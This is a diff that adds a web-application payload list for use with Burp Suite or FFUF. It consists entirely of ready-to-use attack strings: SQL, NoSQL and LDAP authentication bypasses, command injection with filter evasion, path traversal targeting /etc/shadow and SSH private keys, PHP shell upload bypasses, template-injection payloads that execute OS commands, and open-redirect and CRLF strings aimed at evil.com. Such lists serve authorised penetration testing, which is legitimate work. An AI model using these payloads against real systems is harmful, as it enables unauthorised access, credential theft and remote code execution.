@@ -1,0 +1,312 @@
+# Common Web Payloads
+# Use with Burp Suite, FFUF, or manual testing
+
+# ============================================
+# AUTHENTICATION BYPASS
+# ============================================
+
+# SQL Auth Bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+admin'--
+admin'#
+admin'/*
+' OR 'x'='x
+') OR ('x'='x
+" OR "1"="1"--
+" OR "1"="1"/*
+or 1=1
+or 1=1--
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+or true--
+' OR 'a'='a
+') OR ('a'='a
+" OR "a"="a
+
+# NoSQL Auth Bypass (MongoDB)
+{"$gt": ""}
+{"$ne": ""}
+{"$gt": undefined}
+{"$ne": 1}
+admin' || '1'=='1
+admin' || 1==1//
+{$gt: ''}
+{$ne: ''}
+
+# LDAP Injection
+*
+*)(&
+*)(|(&
+pwd)
+*)(|
+*()|%26'
+admin)(&)
+admin)(|(password=*))
+*(|(uid=*))
+
+# ============================================
+# COMMAND INJECTION
+# ============================================
+
+# Basic
+; ls
+| ls
+`ls`
+$(ls)
+& ls
+&& ls
+|| ls
+
+# Windows
+; dir
+| dir
+& dir
+&& dir
+|| dir
+| type C:\windows\win.ini
+
+# Blind (time-based)
+; sleep 10
+| sleep 10
+`sleep 10`
+$(sleep 10)
+& ping -c 10 127.0.0.1
+| ping -n 10 127.0.0.1
+
+# Newline
+%0als
+%0d%0als
+\nls
+\r\nls
+
+# With filter bypass
+;${IFS}ls
+|${IFS}ls
+;$IFS'ls'
+|$IFS'ls'
+;{ls,}
+|{ls,}
+;l\s
+|l''s
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+
+# ============================================
+# PATH TRAVERSAL / LFI
+# ============================================
+
+# Basic
+../
+..\/
+....//
+....\/
+..%2f
+%2e%2e%2f
+%2e%2e/
+..%252f
+%252e%252e%252f
+
+# Linux Files
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/self/environ
+/proc/self/cmdline
+/proc/version
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/auth.log
+~/.bash_history
+~/.ssh/id_rsa
+
+# Windows Files
+..\..\..\windows\win.ini
+..%5c..%5c..%5cwindows\win.ini
+c:\windows\win.ini
+c:\windows\system32\drivers\etc\hosts
+c:\inetpub\logs\logfiles
+c:\inetpub\wwwroot\web.config
+
+# Null byte (old PHP)
+../../../etc/passwd%00
+../../../etc/passwd%00.php
+../../../etc/passwd%00.jpg
+
+# ============================================
+# FILE UPLOAD BYPASS
+# ============================================
+
+# Double extensions
+shell.php.jpg
+shell.php.png
+shell.php%00.jpg
+shell.php%00.png
+shell.php\x00.jpg
+
+# Case variations
+shell.PhP
+shell.pHp
+shell.PHP
+shell.pHP5
+
+# Alternative extensions
+shell.php3
+shell.php4
+shell.php5
+shell.phtml
+shell.phar
+shell.inc
+shell.phps
+
+# Content-Type bypass
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif
+
+# Magic bytes (add to file header)
+GIF89a (for GIF)
+\x89PNG\r\n\x1a\n (for PNG)
+\xFF\xD8\xFF (for JPEG)
+
+# .htaccess upload
+AddType application/x-httpd-php .txt
+AddType application/x-httpd-php .jpg
+
+# ============================================
+# SERVER-SIDE TEMPLATE INJECTION (SSTI)
+# ============================================
+
+# Detection
+${7*7}
+{{7*7}}
+{{7*'7'}}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+${{7*7}}
+@(7*7)
+
+# Jinja2 (Python)
+{{config}}
+{{config.items()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+
+# FreeMarker (Java)
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${7*7}
+
+# ============================================
+# OPEN REDIRECT
+# ============================================
+
+# Basic
+//evil.com
+\/\/evil.com
+/\/evil.com
+https://evil.com
+//evil.com/%2f..
+///evil.com
+////evil.com
+
+# Encoded
+%2f%2fevil.com
+%2f%5cevil.com
+/%09/evil.com
+%00//evil.com
+
+# Using @
+https://target.com@evil.com
+https://target.com%40evil.com
+
+# ============================================
+# HEADER INJECTION
+# ============================================
+
+# CRLF Injection
+%0d%0aSet-Cookie:evil=value
+%0aSet-Cookie:evil=value
+%0d%0aLocation:http://evil.com
+\r\nSet-Cookie:evil=value
+
+# Host Header Injection
+Host: evil.com
+Host: target.com
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+
+# ============================================
+# COMMON PARAMETERS TO TEST
+# ============================================
+
+# Auth/Session
+user
+username
+password
+pass
+pwd
+email
+id
+uid
+session
+token
+auth
+api_key
+key
+
+# Redirection
+url
+redirect
+return
+next
+dest
+destination
+rurl
+return_url
+redirect_url
+callback
+path
+continue
+return_path
+
+# Files
+file
+filename
+path
+filepath
+document
+page
+include
+template
+dir
+folder
+
+# Search/Filtering
+q
+query
+search
+keyword
+id
+name
+filter
+sort
+order
+
+
+
